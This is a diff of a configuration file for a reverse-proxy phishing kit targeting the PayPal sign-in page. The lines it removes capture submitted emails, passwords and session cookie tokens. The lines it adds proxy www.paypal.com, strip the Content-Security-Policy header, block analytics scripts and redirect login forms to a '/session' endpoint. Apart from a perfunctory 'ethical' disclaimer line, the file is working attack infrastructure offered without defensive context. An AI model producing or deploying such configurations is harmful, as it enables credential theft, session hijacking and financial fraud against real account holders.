@@ -1,21 +1,20 @@
-# VANTABLACK PROJECT | ETHICAL DISCLAIMER: USAGE AUTORISÉ UNIQUEMENT
-min_ver: '3.0.0'
+name: "PayPal-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://www.paypal.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript']}
-auth_tokens:
-  - domain: '.paypal.com'
-    keys: ['ts', 'ts_c', 'enforce_policy', 'lgnjs', 'KHclPrC0S_7=']
-credentials:
-  username:
-    key: 'login_email'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'login_password'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'www.paypal.com'
-  path: '/signin'
+  - subdomain: "paypal"
+    target: "www.paypal.com"
+auth_urls: ["/signin"]
+landing_path: ["/signin"]
+auth_tokens: []
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/signin", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|/tagmanager/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"signin\"], form[action*=\"login\"]", action_to: "/session"}
